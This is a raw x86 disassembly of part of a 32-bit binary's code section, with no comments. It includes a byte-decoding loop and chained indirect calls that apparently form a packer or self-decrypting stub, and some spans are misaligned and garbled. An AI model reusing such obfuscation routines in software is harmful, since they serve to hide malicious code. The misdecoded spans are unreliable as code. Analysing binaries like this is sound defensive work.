  4d078e:	cmp    esi,0x4994
  4d0794:	jbe    0x4d0783
  4d0796:	push   0xfffffff4
  4d0798:	call   0x4d0af4
  4d079d:	add    esp,0x4
  4d07a0:	push   esi
  4d07a1:	push   edx
  4d07a2:	push   DWORD PTR [esi+0xc4]
  4d07a8:	push   ebx
  4d07a9:	push   ebx
  4d07aa:	call   0x4d10fc
  4d07af:	add    esp,0x10
  4d07b2:	pop    esi
  4d07b3:	push   0x0
  4d07b5:	call   0x4d1090
  4d07ba:	add    esp,0x4
  4d07bd:	add    esp,0x48
  4d07c0:	pop    ebp
  4d07c1:	ret    
  4d07c2:	add    BYTE PTR [eax],al
  4d07c4:	mov    edi,edi
  4d07c6:	push   ebp
  4d07c7:	mov    ebp,esp
  4d07c9:	sub    esp,0x38
  4d07cc:	lea    eax,ds:0x4d30b0
  4d07d2:	xor    DWORD PTR [ebp-0x20],ecx
  4d07d5:	push   eax
  4d07d6:	push   0x0
  4d07d8:	call   0x4d1090
  4d07dd:	add    esp,0x4
  4d07e0:	pop    eax
  4d07e1:	push   eax
  4d07e2:	push   edi
  4d07e3:	push   DWORD PTR [eax+0x1cc]
  4d07e9:	push   DWORD PTR [eax+0xec]
  4d07ef:	call   0x4d12a0
  4d07f4:	add    esp,0xc
  4d07f7:	pop    eax
  4d07f8:	mov    edx,0x4d2048
  4d07fd:	mov    edx,DWORD PTR [edx]
  4d07ff:	push   edx
  4d0800:	push   DWORD PTR [eax-0x4c]
  4d0803:	pop    esi
  4d0804:	call   esi
  4d0806:	add    esp,0x38
  4d0809:	pop    ebp
  4d080a:	ret    
  4d080b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0811:	sub    esp,0x4c
  4d0814:	lea    eax,[edi-0x60]
  4d0817:	sbb    ecx,0xffffc93d
  4d081d:	push   eax
  4d081e:	push   0x0
  4d0820:	call   0x4d10f0
  4d0825:	add    esp,0x4
  4d0828:	pop    eax
  4d0829:	push   eax
  4d082a:	push   ebx
  4d082b:	push   DWORD PTR [eax+0x48]
  4d082e:	push   esi
  4d082f:	call   0x4d1520
  4d0834:	add    esp,0xc
  4d0837:	pop    eax
  4d0838:	push   eax
  4d0839:	mov    ebx,0x0
  4d083e:	push   ebx
  4d083f:	call   0x4d0850
  4d0844:	add    esp,0x4
  4d0847:	pop    eax
  4d0848:	add    esp,0x4c
  4d084b:	pop    ebp
  4d084c:	ret    
  4d084d:	add    BYTE PTR [eax],al
  4d084f:	add    BYTE PTR [edi-0x1],bl
  4d0852:	adc    eax,0x4d202c
  4d0857:	call   edi
  4d0859:	add    BYTE PTR [eax],al
  4d085b:	add    BYTE PTR [edi-0x1],bl
  4d085e:	adc    eax,0x4d2058
  4d0863:	call   edi
  4d0865:	add    BYTE PTR [eax],al
  4d0867:	add    BYTE PTR [edi-0x1],bl
  4d086a:	adc    eax,0x4d209c
  4d086f:	call   edi
  4d0871:	add    BYTE PTR [eax],al
  4d0873:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0879:	sub    esp,0x58
  4d087c:	lea    ebx,[edi+0x74]
  4d087f:	adc    DWORD PTR [ebp-0x3c],0xffffec9a
  4d0886:	push   0xfffffff4
  4d0888:	call   0x4d0af4
  4d088d:	add    esp,0x4
  4d0890:	push   ebx
  4d0891:	push   DWORD PTR [ebx+0xbc]
  4d0897:	push   eax
  4d0898:	push   DWORD PTR [ebx+0x1e8]
  4d089e:	call   0x4d12ec
  4d08a3:	add    esp,0xc
  4d08a6:	pop    ebx
  4d08a7:	push   0x0
  4d08a9:	call   0x4d10f0
  4d08ae:	add    esp,0x4
  4d08b1:	add    esp,0x58
  4d08b4:	pop    ebp
  4d08b5:	ret    
  4d08b6:	add    BYTE PTR [eax],al
  4d08b8:	mov    edi,edi
  4d08ba:	push   ebp
  4d08bb:	mov    ebp,esp
  4d08bd:	sub    esp,0x5c
  4d08c0:	adc    DWORD PTR [eax-0x58],0x75c0
  4d08c7:	lea    ebx,[eax-0x4]
  4d08ca:	mov    edx,0x6ac
  4d08cf:	push   edx
  4d08d0:	push   0x6ac
  4d08d5:	mov    esi,0x40001
  4d08da:	push   esi
  4d08db:	mov    ecx,0x86298592
  4d08e0:	push   DWORD PTR [ecx+0x7a239a86]
  4d08e6:	sub    DWORD PTR [esp],0x2
  4d08ea:	mov    ecx,0x4d2004
  4d08ef:	pop    DWORD PTR [ecx]
  4d08f1:	call   0x4d0ecc
  4d08f6:	add    esp,0x4
  4d08f9:	push   eax
  4d08fa:	pop    DWORD PTR [ebx+0x8]
  4d08fd:	mov    eax,DWORD PTR [ebx+0x8]
  4d0900:	mov    edi,eax
  4d0902:	sub    edx,edx
  4d0904:	dec    edx
  4d0905:	and    edx,0x4d0014
  4d090b:	mov    eax,0xd5d9a824
  4d0910:	mov    esi,0x6ac
  4d0915:	cmp    esi,0x0
  4d0918:	je     0x4d0936
  4d091a:	add    esi,0xfffffffc
  4d091d:	xor    ecx,ecx
  4d091f:	push   DWORD PTR [edx+ecx*1]
  4d0922:	add    DWORD PTR [esp],eax
  4d0925:	pop    DWORD PTR [edi+ecx*2]
  4d0928:	dec    DWORD PTR [edi]
  4d092a:	xor    eax,eax
  4d092c:	add    eax,DWORD PTR [edx]
  4d092e:	add    edx,0x4
  4d0931:	add    edi,0x4
  4d0934:	jmp    0x4d0915
  4d0936:	call   0x4d0f24
  4d093b:	add    esp,0x4
  4d093e:	add    esp,0x5c
  4d0941:	pop    ebp
  4d0942:	ret    
  4d0943:	add    BYTE PTR [edi-0x1],bl
  4d0946:	adc    eax,0x4d2000
  4d094b:	call   edi
  4d094d:	add    BYTE PTR [eax],al
  4d094f:	add    BYTE PTR [edi-0x1],bl
  4d0952:	adc    eax,0x4d203c
  4d0957:	call   edi
  4d0959:	add    BYTE PTR [eax],al
  4d095b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0961:	sub    esp,0x30
  4d0964:	lea    esi,[ecx-0x50]
  4d0967:	add    DWORD PTR [ebp-0x2c],eax
  4d096a:	push   esi
  4d096b:	push   ebx
  4d096c:	push   DWORD PTR [esi+0xc]
  4d096f:	call   0x4d1008
  4d0974:	add    esp,0x8
  4d0977:	pop    esi
  4d0978:	mov    edx,0x0
  4d097d:	push   edx
  4d097e:	call   0x4d10e4
  4d0983:	add    esp,0x4
  4d0986:	mov    edx,0x0
  4d098b:	push   edx
  4d098c:	call   0x4d0950
  4d0991:	add    esp,0x4
  4d0994:	add    esp,0x30
  4d0997:	pop    ebp
  4d0998:	ret    
  4d0999:	add    BYTE PTR [eax],al
  4d099b:	add    BYTE PTR [edi-0x1],bl
  4d099e:	adc    eax,0x4d2028
  4d09a3:	call   edi
  4d09a5:	add    BYTE PTR [eax],al
  4d09a7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09ad:	sub    esp,0x24
  4d09b0:	lea    eax,[ecx-0x38]
  4d09b3:	sbb    DWORD PTR [ebp-0x8],0xffffffa3
  4d09b7:	push   eax
  4d09b8:	call   0x4d1240
  4d09bd:	add    esp,0x4
  4d09c0:	pop    eax
  4d09c1:	push   eax
  4d09c2:	push   DWORD PTR [eax+0x4]
  4d09c5:	push   DWORD PTR [eax+0x1dc]
  4d09cb:	push   ebx
  4d09cc:	push   ebx
  4d09cd:	call   0x4d0c04
  4d09d2:	add    esp,0x10
  4d09d5:	pop    eax
  4d09d6:	push   eax
  4d09d7:	call   0x4d1240
  4d09dc:	add    esp,0x4
  4d09df:	pop    eax
  4d09e0:	add    esp,0x24
  4d09e3:	pop    ebp
  4d09e4:	ret    
  4d09e5:	add    BYTE PTR [eax],al
  4d09e7:	add    BYTE PTR [edi-0x1],bl
  4d09ea:	adc    eax,0x4d2098
  4d09ef:	call   edi
  4d09f1:	add    BYTE PTR [eax],al
  4d09f3:	add    BYTE PTR [edi-0x1],bl
  4d09f6:	adc    eax,0x4d2070
  4d09fb:	call   edi
  4d09fd:	add    BYTE PTR [eax],al
  4d09ff:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a05:	sub    esp,0x34
  4d0a08:	lea    eax,ds:0x4d3060
  4d0a0e:	add    esi,edx
  4d0a10:	push   eax
  4d0a11:	push   0x0
  4d0a13:	call   0x4d0850
  4d0a18:	add    esp,0x4
  4d0a1b:	pop    eax
  4d0a1c:	push   eax
  4d0a1d:	push   DWORD PTR [eax+0x138]
  4d0a23:	push   esi
  4d0a24:	push   DWORD PTR [eax+0x6c]
  4d0a27:	push   edi
  4d0a28:	call   0x4d08b8
  4d0a2d:	add    esp,0x10
  4d0a30:	pop    eax
  4d0a31:	push   eax
  4d0a32:	mov    edx,0x0
  4d0a37:	push   edx
  4d0a38:	call   0x4d1090
  4d0a3d:	add    esp,0x4
  4d0a40:	pop    eax
  4d0a41:	add    esp,0x34
  4d0a44:	pop    ebp
  4d0a45:	ret    
  4d0a46:	add    BYTE PTR [eax],al
  4d0a48:	mov    edi,edi
  4d0a4a:	push   ebp
  4d0a4b:	mov    ebp,esp
  4d0a4d:	sub    esp,0x44
  4d0a50:	lea    esi,ds:0x4d3178
  4d0a56:	sbb    eax,edx
  4d0a58:	mov    ebx,0x0
  4d0a5d:	push   ebx
  4d0a5e:	call   0x4d0850
  4d0a63:	add    esp,0x4
  4d0a66:	push   esi
  4d0a67:	push   DWORD PTR [esi+0x1a4]
  4d0a6d:	push   DWORD PTR [esi+0x194]
  4d0a73:	push   DWORD PTR [esi+0x104]
  4d0a79:	call   0x4d0dc8
  4d0a7e:	add    esp,0xc
  4d0a81:	pop    esi
  4d0a82:	mov    edx,0x0
  4d0a87:	push   edx
  4d0a88:	call   0x4d1090
  4d0a8d:	add    esp,0x4
  4d0a90:	add    esp,0x44
  4d0a93:	pop    ebp
  4d0a94:	ret    
  4d0a95:	add    BYTE PTR [eax],al
  4d0a97:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a9d:	sub    esp,0x30
  4d0aa0:	lea    edi,[esi+0x8c]
  4d0aa6:	xor    DWORD PTR [edi-0xe4],0x6d96
  4d0ab0:	push   edi
  4d0ab1:	push   esi
  4d0ab2:	push   DWORD PTR [edi+0x50]
  4d0ab5:	push   edx
  4d0ab6:	push   DWORD PTR [edi+0xe4]
  4d0abc:	call   0x4d0a48
  4d0ac1:	add    esp,0x10
  4d0ac4:	pop    edi
  4d0ac5:	push   edi
  4d0ac6:	push   0x0
  4d0ac8:	call   0x4d0bf8
  4d0acd:	add    esp,0x4
  4d0ad0:	pop    edi
  4d0ad1:	push   edi
  4d0ad2:	mov    ecx,0x0
  4d0ad7:	push   ecx
  4d0ad8:	call   0x4d0850
  4d0add:	add    esp,0x4
  4d0ae0:	pop    edi
  4d0ae1:	add    esp,0x30
  4d0ae4:	pop    ebp
  4d0ae5:	ret    
  4d0ae6:	add    BYTE PTR [eax],al
  4d0ae8:	pop    edi
  4d0ae9:	call   DWORD PTR ds:0x4d2038
  4d0aef:	call   edi
  4d0af1:	add    BYTE PTR [eax],al
  4d0af3:	add    BYTE PTR [edi-0x1],bl
  4d0af6:	adc    eax,0x4d2044
  4d0afb:	call   edi
  4d0afd:	add    BYTE PTR [eax],al
  4d0aff:	add    BYTE PTR [edi-0x1],bl
  4d0b02:	adc    eax,0x4d208c
  4d0b07:	call   edi
  4d0b09:	add    BYTE PTR [eax],al
  4d0b0b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b11:	sub    esp,0x40
  4d0b14:	mov    eax,0x4d306c
  4d0b19:	cmp    eax,0x3a6b
  4d0b1e:	jbe    0x4d0b0f
  4d0b20:	push   eax
  4d0b21:	mov    edx,0x0
  4d0b26:	push   edx
  4d0b27:	call   0x4d1090
  4d0b2c:	add    esp,0x4
  4d0b2f:	pop    eax
  4d0b30:	push   eax
  4d0b31:	push   DWORD PTR [eax+0x120]
  4d0b37:	push   DWORD PTR [eax+0x1f0]
  4d0b3d:	push   DWORD PTR [eax+0x1b0]
  4d0b43:	call   0x4d104c
  4d0b48:	add    esp,0xc
  4d0b4b:	pop    eax
  4d0b4c:	push   eax
  4d0b4d:	push   0xfffffff4
  4d0b4f:	call   0x4d0af4
  4d0b54:	add    esp,0x4
  4d0b57:	pop    eax
  4d0b58:	add    esp,0x40
  4d0b5b:	pop    ebp
  4d0b5c:	ret    
  4d0b5d:	add    BYTE PTR [eax],al
  4d0b5f:	add    BYTE PTR [edi-0x1],bl
  4d0b62:	adc    eax,0x4d20a0
  4d0b67:	call   edi
  4d0b69:	add    BYTE PTR [eax],al
  4d0b6b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b71:	sub    esp,0x60
  4d0b74:	lea    eax,[edi+0xec]
  4d0b7a:	add    DWORD PTR [ebp-0x24],ecx
  4d0b7d:	push   eax
  4d0b7e:	push   ecx
  4d0b7f:	push   ecx
  4d0b80:	call   0x4d0d30
  4d0b85:	add    esp,0x8
  4d0b88:	pop    eax
  4d0b89:	push   eax
  4d0b8a:	mov    edx,0x0
  4d0b8f:	push   edx
  4d0b90:	call   0x4d10f0
  4d0b95:	add    esp,0x4
  4d0b98:	pop    eax
  4d0b99:	push   eax
  4d0b9a:	mov    eax,0x0
  4d0b9f:	push   eax
  4d0ba0:	call   0x4d1234
  4d0ba5:	add    esp,0x4
  4d0ba8:	pop    eax
  4d0ba9:	add    esp,0x60
  4d0bac:	pop    ebp
  4d0bad:	ret    
  4d0bae:	add    BYTE PTR [eax],al
  4d0bb0:	mov    edi,edi
  4d0bb2:	push   ebp
  4d0bb3:	mov    ebp,esp
  4d0bb5:	sub    esp,0x2c
  4d0bb8:	lea    edx,ds:0x4d3044
  4d0bbe:	xor    ebx,DWORD PTR [ebp-0x20]
  4d0bc1:	push   edx
  4d0bc2:	push   0x0
  4d0bc4:	call   0x4d1234
  4d0bc9:	add    esp,0x4
  4d0bcc:	pop    edx
  4d0bcd:	push   edx
  4d0bce:	push   edi
  4d0bcf:	push   eax
  4d0bd0:	push   DWORD PTR [edx+0x160]
  4d0bd6:	push   ebx
  4d0bd7:	call   0x4d11f8
  4d0bdc:	add    esp,0x10
  4d0bdf:	pop    edx
  4d0be0:	push   edx
  4d0be1:	mov    esi,0x0
  4d0be6:	push   esi
  4d0be7:	call   0x4d10f0
  4d0bec:	add    esp,0x4
  4d0bef:	pop    edx
  4d0bf0:	add    esp,0x2c
  4d0bf3:	pop    ebp
  4d0bf4:	ret    
  4d0bf5:	add    BYTE PTR [eax],al
  4d0bf7:	add    BYTE PTR [edi-0x1],bl
  4d0bfa:	adc    eax,0x4d2014
  4d0bff:	call   edi
  4d0c01:	add    BYTE PTR [eax],al
  4d0c03:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c09:	sub    esp,0x2c
  4d0c0c:	lea    edx,ds:0x4d31cc
  4d0c12:	or     ebx,eax
  4d0c14:	push   edx
  4d0c15:	mov    edx,0xfffffff4
  4d0c1a:	push   edx
  4d0c1b:	call   0x4d0af4
  4d0c20:	add    esp,0x4
  4d0c23:	pop    edx
  4d0c24:	push   edx
  4d0c25:	push   ecx
  4d0c26:	push   ebx
  4d0c27:	call   0x4d1384
  4d0c2c:	add    esp,0x8
  4d0c2f:	pop    edx
  4d0c30:	push   edx
  4d0c31:	push   0x0
  4d0c33:	call   0x4d119c
  4d0c38:	add    esp,0x4
  4d0c3b:	pop    edx
  4d0c3c:	add    esp,0x2c
  4d0c3f:	pop    ebp
  4d0c40:	ret    
  4d0c41:	add    BYTE PTR [eax],al
  4d0c43:	add    BYTE PTR [edi+0x2b],dl
  4d0c46:	call   DWORD PTR [edi+0x57]
  4d0c49:	push   edi
  4d0c4a:	push   edi
  4d0c4b:	call   0x4d1240
  4d0c50:	sub    esp,0xfffffffc
  4d0c53:	call   0x4d0944
  4d0c58:	push   0x2
  4d0c5a:	xor    eax,eax
  4d0c5c:	dec    eax
  4d0c5d:	and    eax,0x4d3030
  4d0c62:	push   0x0
  4d0c64:	lea    ecx,[eax+0x6]
  4d0c67:	add    BYTE PTR [ecx],0x41
  4d0c6a:	push   eax
  4d0c6b:	call   0x4d0ecc
  4d0c70:	pop    edi
  4d0c71:	pop    edi
  4d0c72:	pop    edi
  4d0c73:	lea    edi,[eax+0x3b]
  4d0c76:	mov    edi,DWORD PTR [edi]
  4d0c78:	lea    eax,[eax+edi*1]
  4d0c7b:	mov    eax,DWORD PTR [eax+0x28]
  4d0c7e:	pusha  
  4d0c7f:	mov    ah,0x45
  4d0c81:	sub    al,ah
  4d0c83:	ja     0x4d07c4
  4d0c89:	popa   
  4d0c8a:	ret    
  4d0c8b:	add    BYTE PTR [edi-0x1],bl
  4d0c8e:	adc    eax,0x4d2064
  4d0c93:	call   edi
  4d0c95:	add    BYTE PTR [eax],al
  4d0c97:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c9d:	sub    esp,0x44
  4d0ca0:	lea    eax,ds:0x4d30d8
  4d0ca6:	cmp    eax,0xa4d
  4d0cab:	jbe    0x4d0c9b
  4d0cad:	push   eax
  4d0cae:	mov    edx,0x0
  4d0cb3:	push   edx
  4d0cb4:	call   0x4d119c
  4d0cb9:	add    esp,0x4
  4d0cbc:	pop    eax
  4d0cbd:	push   eax
  4d0cbe:	push   DWORD PTR [eax+0x24]
  4d0cc1:	push   ecx
  4d0cc2:	call   0x4d0ee4
  4d0cc7:	add    esp,0x8
  4d0cca:	pop    eax
  4d0ccb:	push   eax
  4d0ccc:	mov    ecx,0xfffffff4
  4d0cd1:	push   ecx
  4d0cd2:	call   0x4d0af4
  4d0cd7:	add    esp,0x4
  4d0cda:	pop    eax
  4d0cdb:	add    esp,0x44
  4d0cde:	pop    ebp
  4d0cdf:	ret    
  4d0ce0:	mov    edi,edi
  4d0ce2:	push   ebp
  4d0ce3:	mov    ebp,esp
  4d0ce5:	sub    esp,0x4c
  4d0ce8:	lea    eax,ds:0x4d31f4
  4d0cee:	cmp    eax,0x3099
  4d0cf3:	jb     0x4d0ce3
  4d0cf5:	push   eax
  4d0cf6:	push   edi
  4d0cf7:	push   ecx
  4d0cf8:	push   DWORD PTR [eax+0x28]
  4d0cfb:	push   DWORD PTR [eax+0x158]
  4d0d01:	call   0x4d1480
  4d0d06:	add    esp,0x10
  4d0d09:	pop    eax
  4d0d0a:	push   eax
  4d0d0b:	call   0x4d0734
  4d0d10:	add    esp,0x4
  4d0d13:	pop    eax
  4d0d14:	push   eax
  4d0d15:	call   0x4d1240
  4d0d1a:	add    esp,0x4
  4d0d1d:	pop    eax
  4d0d1e:	add    esp,0x4c
  4d0d21:	pop    ebp
  4d0d22:	ret    
  4d0d23:	add    BYTE PTR [edi-0x1],bl
  4d0d26:	adc    eax,0x4d204c
  4d0d2b:	call   edi
  4d0d2d:	add    BYTE PTR [eax],al
  4d0d2f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d35:	sub    esp,0x30
  4d0d38:	lea    edx,[eax+0x24]
  4d0d3b:	adc    DWORD PTR [edx-0x14],edx
  4d0d3e:	push   edx
  4d0d3f:	push   DWORD PTR [edx+0xd4]
  4d0d45:	push   DWORD PTR [edx+0x1f0]
  4d0d4b:	push   esi
  4d0d4c:	push   DWORD PTR [edx+0x118]
  4d0d52:	call   0x4d124c
  4d0d57:	add    esp,0x10
  4d0d5a:	pop    edx
  4d0d5b:	push   edx
  4d0d5c:	mov    edx,0x0
  4d0d61:	push   edx
  4d0d62:	call   0x4d1090
  4d0d67:	add    esp,0x4
  4d0d6a:	pop    edx
  4d0d6b:	push   edx
  4d0d6c:	push   0x0
  4d0d6e:	call   0x4d0bf8
  4d0d73:	add    esp,0x4
  4d0d76:	pop    edx
  4d0d77:	add    esp,0x30
  4d0d7a:	pop    ebp
  4d0d7b:	ret    
  4d0d7c:	mov    edi,edi
  4d0d7e:	push   ebp
  4d0d7f:	mov    ebp,esp
  4d0d81:	sub    esp,0x58
  4d0d84:	lea    ecx,[ebx+0x44]
  4d0d87:	mov    DWORD PTR [ebp-0x40],0xffffffdc
  4d0d8e:	push   ecx
  4d0d8f:	push   0x0
  4d0d91:	call   0x4d10e4
  4d0d96:	add    esp,0x4
  4d0d99:	pop    ecx
  4d0d9a:	push   ecx
  4d0d9b:	push   DWORD PTR [ecx+0x150]
  4d0da1:	push   DWORD PTR [ecx+0x78]
  4d0da4:	push   esi
  4d0da5:	push   DWORD PTR [ecx+0x1e0]
  4d0dab:	call   0x4d0ce0
  4d0db0:	add    esp,0x10
  4d0db3:	pop    ecx
  4d0db4:	push   ecx
  4d0db5:	push   0x0
  4d0db7:	call   0x4d1144
  4d0dbc:	add    esp,0x4
  4d0dbf:	pop    ecx
  4d0dc0:	add    esp,0x58
  4d0dc3:	pop    ebp
  4d0dc4:	ret    
  4d0dc5:	add    BYTE PTR [eax],al
  4d0dc7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0dcd:	sub    esp,0x28
  4d0dd0:	lea    ecx,ds:0x4d30ac
  4d0dd6:	or     edx,DWORD PTR [ebp-0x8]
  4d0dd9:	push   ecx
  4d0dda:	push   edi
  4d0ddb:	push   esi
  4d0ddc:	call   0x4d095c
  4d0de1:	add    esp,0x8
  4d0de4:	pop    ecx
  4d0de5:	push   ecx
  4d0de6:	mov    ecx,0x0
  4d0deb:	push   ecx
  4d0dec:	call   0x4d0850
  4d0df1:	add    esp,0x4
  4d0df4:	pop    ecx
  4d0df5:	push   ecx
  4d0df6:	mov    esi,0x0
  4d0dfb:	push   esi
  4d0dfc:	call   0x4d1234
  4d0e01:	add    esp,0x4
  4d0e04:	pop    ecx
  4d0e05:	add    esp,0x28
  4d0e08:	pop    ebp
  4d0e09:	ret    
  4d0e0a:	add    BYTE PTR [eax],al
  4d0e0c:	pop    edi
  4d0e0d:	call   DWORD PTR ds:0x4d205c
  4d0e13:	call   edi
  4d0e15:	add    BYTE PTR [eax],al
  4d0e17:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e1d:	sub    esp,0x58
  4d0e20:	lea    esi,[ecx+0xc0]
  4d0e26:	cmp    esi,0x1e08
  4d0e2c:	je     0x4d0e1b
  4d0e2e:	call   0x4d1240
  4d0e33:	add    esp,0x4
  4d0e36:	push   esi
  4d0e37:	push   DWORD PTR [esi+0xb0]
  4d0e3d:	push   DWORD PTR [esi+0x15c]
  4d0e43:	push   ecx
  4d0e44:	push   DWORD PTR [esi+0x40]
  4d0e47:	call   0x4d0a98
  4d0e4c:	add    esp,0x10
  4d0e4f:	pop    esi
  4d0e50:	mov    edx,0x0
  4d0e55:	push   edx
  4d0e56:	call   0x4d0950
  4d0e5b:	add    esp,0x4
  4d0e5e:	add    esp,0x58
  4d0e61:	pop    ebp
  4d0e62:	ret    
  4d0e63:	add    BYTE PTR [edi-0x1],bl
  4d0e66:	adc    eax,0x4d2088
  4d0e6b:	call   edi
  4d0e6d:	add    BYTE PTR [eax],al
  4d0e6f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0e75:	sub    esp,0x24
  4d0e78:	lea    ecx,ds:0x4d31d0
  4d0e7e:	mov    DWORD PTR [ebp-0x18],0x70
  4d0e85:	push   ecx
  4d0e86:	push   DWORD PTR [ecx+0x16c]
  4d0e8c:	push   DWORD PTR [ecx+0x1a0]
  4d0e92:	push   edx
  4d0e93:	push   edx
  4d0e94:	call   0x4d0f30
  4d0e99:	add    esp,0x10
  4d0e9c:	pop    ecx
  4d0e9d:	push   ecx
  4d0e9e:	mov    esi,0xfffffff4
  4d0ea3:	push   esi
  4d0ea4:	call   0x4d0af4
  4d0ea9:	add    esp,0x4
  4d0eac:	pop    ecx
  4d0ead:	push   ecx
  4d0eae:	push   0x0
  4d0eb0:	call   0x4d10f0
  4d0eb5:	add    esp,0x4
  4d0eb8:	pop    ecx
  4d0eb9:	add    esp,0x24
  4d0ebc:	pop    ebp
  4d0ebd:	ret    
  4d0ebe:	add    BYTE PTR [eax],al
  4d0ec0:	pop    edi
  4d0ec1:	call   DWORD PTR ds:0x4d2090
  4d0ec7:	call   edi
  4d0ec9:	add    BYTE PTR [eax],al
  4d0ecb:	add    BYTE PTR [edi-0x1],bl
  4d0ece:	adc    eax,0x4d2004
  4d0ed3:	call   edi
  4d0ed5:	add    BYTE PTR [eax],al
  4d0ed7:	add    BYTE PTR [edi-0x1],bl
  4d0eda:	adc    eax,0x4d2068
  4d0edf:	call   edi
  4d0ee1:	add    BYTE PTR [eax],al
  4d0ee3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ee9:	sub    esp,0x30
  4d0eec:	lea    edx,[eax+0x44]
  4d0eef:	sub    esi,DWORD PTR [ebp-0x24]
  4d0ef2:	push   edx
  4d0ef3:	push   ebx
  4d0ef4:	push   DWORD PTR [edx+0xd0]
  4d0efa:	push   edi
  4d0efb:	push   eax
  4d0efc:	call   0x4d1344
  4d0f01:	add    esp,0x10
  4d0f04:	pop    edx
  4d0f05:	push   edx
  4d0f06:	mov    edi,0x0
  4d0f0b:	push   edi
  4d0f0c:	call   0x4d0850
  4d0f11:	add    esp,0x4
  4d0f14:	pop    edx
  4d0f15:	push   edx
  4d0f16:	call   0x4d0f24
  4d0f1b:	add    esp,0x4
  4d0f1e:	pop    edx
  4d0f1f:	add    esp,0x30
  4d0f22:	pop    ebp
  4d0f23:	ret    
  4d0f24:	pop    edi
  4d0f25:	call   DWORD PTR ds:0x4d2020
  4d0f2b:	call   edi
  4d0f2d:	add    BYTE PTR [eax],al
  4d0f2f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f35:	sub    esp,0x50
  4d0f38:	lea    edx,[ecx-0x130]
  4d0f3e:	and    ebx,esi
  4d0f40:	push   edx
  4d0f41:	push   0x0
  4d0f43:	call   0x4d10f0
  4d0f48:	add    esp,0x4
  4d0f4b:	pop    edx
  4d0f4c:	push   edx
  4d0f4d:	push   ecx
  4d0f4e:	push   eax
  4d0f4f:	push   DWORD PTR [edx+0x48]
  4d0f52:	call   0x4d0fbc
  4d0f57:	add    esp,0xc
  4d0f5a:	pop    edx
  4d0f5b:	push   edx
  4d0f5c:	mov    edx,0x0
  4d0f61:	push   edx
  4d0f62:	call   0x4d0850
  4d0f67:	add    esp,0x4
  4d0f6a:	pop    edx
  4d0f6b:	add    esp,0x50
  4d0f6e:	pop    ebp
  4d0f6f:	ret    
  4d0f70:	mov    edi,edi
  4d0f72:	push   ebp
  4d0f73:	mov    ebp,esp
  4d0f75:	sub    esp,0x58
  4d0f78:	lea    ebx,ds:0x4d3084
  4d0f7e:	mov    esi,DWORD PTR [ebx+0x124]
  4d0f84:	push   ebx
  4d0f85:	push   DWORD PTR [ebx+0x158]
  4d0f8b:	push   DWORD PTR [ebx+0xac]
  4d0f91:	push   DWORD PTR [ebx+0x2c]
  4d0f94:	call   0x4d0c98
  4d0f99:	add    esp,0xc
  4d0f9c:	pop    ebx
  4d0f9d:	push   0x0
  4d0f9f:	call   0x4d1144
  4d0fa4:	add    esp,0x4
  4d0fa7:	mov    edi,0x0
  4d0fac:	push   edi
  4d0fad:	call   0x4d1234
  4d0fb2:	add    esp,0x4
  4d0fb5:	add    esp,0x58
  4d0fb8:	pop    ebp
  4d0fb9:	ret    
  4d0fba:	add    BYTE PTR [eax],al
  4d0fbc:	mov    edi,edi
  4d0fbe:	push   ebp
  4d0fbf:	mov    ebp,esp
  4d0fc1:	sub    esp,0x5c
  4d0fc4:	lea    edi,ds:0x4d3004
  4d0fca:	adc    DWORD PTR [ebp-0x28],edi
  4d0fcd:	push   edi
  4d0fce:	push   DWORD PTR [edi+0x1a4]
  4d0fd4:	push   eax
  4d0fd5:	push   DWORD PTR [edi+0x100]
  4d0fdb:	call   0x4d0b6c
  4d0fe0:	add    esp,0xc
  4d0fe3:	pop    edi
  4d0fe4:	push   edi
  4d0fe5:	call   0x4d1240
  4d0fea:	add    esp,0x4
  4d0fed:	pop    edi
  4d0fee:	push   edi
  4d0fef:	lea    ecx,[edi-0x4]
  4d0ff2:	push   ecx
  4d0ff3:	call   0x4d132c
  4d0ff8:	add    esp,0x4
  4d0ffb:	test   eax,eax
  4d0ffd:	jne    0x4d0fef
  4d0fff:	pop    edi
  4d1000:	add    esp,0x5c
  4d1003:	pop    ebp
  4d1004:	ret    
  4d1005:	add    BYTE PTR [eax],al
  4d1007:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d100d:	sub    esp,0x2c
  4d1010:	lea    ebx,ds:0x4d3118
  4d1016:	or     DWORD PTR [ebp-0x14],eax
  4d1019:	mov    edi,0x0
  4d101e:	push   edi
  4d101f:	call   0x4d0bf8
  4d1024:	add    esp,0x4
  4d1027:	push   ebx
  4d1028:	push   eax
  4d1029:	push   ecx
  4d102a:	push   DWORD PTR [ebx+0x138]
  4d1030:	call   0x4d0d7c
  4d1035:	add    esp,0xc
  4d1038:	pop    ebx
  4d1039:	mov    edx,0x0
  4d103e:	push   edx
  4d103f:	call   0x4d1144
  4d1044:	add    esp,0x4
  4d1047:	add    esp,0x2c
  4d104a:	pop    ebp
  4d104b:	ret    
  4d104c:	mov    edi,edi
  4d104e:	push   ebp
  4d104f:	mov    ebp,esp
  4d1051:	sub    esp,0x54
  4d1054:	lea    esi,[eax+0x18c]
  4d105a:	sub    DWORD PTR [ebp-0x3c],0x15
  4d105e:	push   esi
  4d105f:	push   ebx
  4d1060:	push   DWORD PTR [esi+0x130]
  4d1066:	push   DWORD PTR [esi+0x120]
  4d106c:	call   0x4d1150
  4d1071:	add    esp,0xc
  4d1074:	pop    esi
  4d1075:	push   0x0
  4d1077:	call   0x4d1090
  4d107c:	add    esp,0x4
  4d107f:	push   0x0
  4d1081:	call   0x4d119c
  4d1086:	add    esp,0x4
  4d1089:	add    esp,0x54
  4d108c:	pop    ebp
  4d108d:	ret    
  4d108e:	add    BYTE PTR [eax],al
  4d1090:	pop    edi
